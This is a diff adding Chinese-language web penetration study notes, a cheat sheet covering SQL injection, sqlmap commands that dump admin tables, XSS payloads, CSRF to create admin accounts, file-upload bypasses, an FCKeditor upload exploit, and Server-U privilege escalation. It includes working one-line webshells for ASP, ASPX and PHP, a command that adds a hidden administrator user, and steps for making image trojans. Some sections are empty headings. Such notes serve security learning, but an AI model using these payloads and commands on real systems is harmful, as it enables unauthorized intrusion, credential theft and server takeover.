@@ -1,0 +1,133 @@
+## SQL注入原理
+所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令
+### 相关函数
+mid()---从文本中提取字符串
+```sql
+SELECT MID(column_name, start[, length]) FROM table_name;
+```
+column_name: 字段名，必需。
+start: 查询的开始位置（起始值为1）
+length: 可选。返回需要查询的字符数。如何忽略，则返回剩余文本。
+
+limit()---返回指定行之前数据
+```sql
+select * from user limit m, n;
+```
+
+concat、concat_ws、group_concat
+MySQL的concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULL,而concat_ws不会
+
+group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator '分隔符'])
+
+count()---统计字符个数
+
+rand()---产生0-1随机数
+
+floor()---乡下取整
+
+group by---依据我们想要的规则对结果进行分组
+
+length()---返回字符串的长度
+
+Substr()---截取字符串 三个参数 （所要截取字符串，截取的位置，截取的长度）
+
+Ascii()---返回字符串的ascii码
+
+### 报错注入
+
+### SQL注入原理-手工注入access
+- 1.通过`'`、`and 1=1`、`and 1=2`来判断是否存在注入点
+- 2.通过 and exists(select * from admin)  猜表名
+- 3.通过 and exists(select user from admin) 猜列名
+- 4.通过 and (select top 1 len(user) from admin ) > 1 来猜解字段长度
+- 5.通过 and (select top 1 asc(mid(user,1,1)) from admin) > 97 判断字段名
+
+### SQL注入原理-手工联合查询注入
+
+
+## PHP过滤函数
+- 1. `mysql_real_escape_string()` 转义字符串中特殊字符，可以通过编码绕过如url编码
+- 2.`stripslashes() `在默认情况下，PHP会对所有的GET，POST和COOKIE数据自动进行addslashes(),addslashes()函数返回在预定义字符前添加反斜杠的字符串，就是将“'”变成“\'”,而stripslashes()是删除有addslashes()函数添加的反斜杠。
+- 3.`is_numeric()`函数检查只是否为数字
+
+
+## Sqlmap破解access数据库
+```
+sqlmap -u http://xxx.asp?id=1  # -u扫描注入点
+
+sqlmap -u http://xxx.asp?id=1 --users  #获取用户名
+
+sqlmap -u http://xxx.asp?id=1 --dump -tables #探测数据库和表信息 （会提示继续探测字段信息）
+
+sqlmap -u http://xxx.asp?id=1 --dump -T admin -C admin,password  #爆库
+```
+
+## CSRF利用管理员权限创建后台管理账户
+**通过普通用户的存储型XSS实现创建管理员账户的CSRF利用**
+- 在用户的个人中心中找找可以添加信息的区域，如在物品简介页面直接插入script,如加入可以提升权限的<sript>,等待管理员点击页面
+
+## 反射型XSS
+在XSS的攻击方式中需要欺骗用户去点击链接才能触发的XSS称为反射型XSS。
+
+## 存储型XSS
+ 寻找留言板等交互信息处。对于存在文本框输入长度限制的可以使用：
+- 1. 插入`*/</script>`
+- 2. 插入`<script>alert(/XSS/)/*`
+
+
+## 一句话木马
+连接一句话，需要将其插入到一个正常的网站文件中，如asp插入到asp文件中。
+asp: `<%eval request("pass") %>`
+aspx: `<%@ Page Language="Jscript" %><% eval(Request.Item["pass"],"unsafe"); %>`
+php: `<?php eval($_POST['pass']); ?>`
+
+## 利用0x00截断上传Webshell
+假设文件上传路径为`http://xx/upload/xx.php.jpg` 利用burpsuite抓包后将xx.php后面的`.`即16进制的`2e`改成`00`。因为在上传的时候，当文件系统读到[0x00]时，会认为文件已经结束，从而写入php
+
+## 绕过前台脚本检测拓展名
+burpsuite 抓包该后缀名
+
+## apache解析漏洞上传shell
+apache2.x遇到不识别的拓展名会向前一次识别，直到遇到能识别的拓展名。
+
+## 绕过Content——Type检测文件类型上传
+Burpsuite截包改类型如`application/octetstream`改为`image/gif`
+
+## SQL SERVER 局部变量 “@”开头的标识符表示变量（局部变量），该变量必须先用DECLARE命令声明后才能使用
+
+## Fckeditor2.4.2 编辑器上传漏洞
+- 1. 访问`http://xxx/fckeditor`,如出现403进制访问，说明目录存在
+- 2. 访问 `http://xxx/fckeditor/_whatsnew.html` 查看编辑器版本
+- 3. 访问 `http://xxx/fckeditor/editor/filemanager/brower/default/browser.html?type=Image&connectors/asp/connector.asp`上传图片马，用0x00截断
+
+## 绕过服务器拓展名检测
+改成未识别的后缀名，绕过黑白名单
+
+## server-u提权
+上传webshell，检测端口`netstat -an` 查看是否有默认端口号43985，有的话说明存在server-u服务，使用命令`cmd/c net user aaa 123 /add &net localgroup administrator aaa /add`,然后远程连接
+
+## 1433端口--> mssql数据库
+ 
+## 图片木马
+对于在服务器端对文件内容检测的，可以
+- 1.`copy xx.jpg/b+ shell.php/a webshell.jpg`
+- 2.webshell.jpg改名为webshell.jpg.php，然后上传
+- 3. 菜刀连接
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
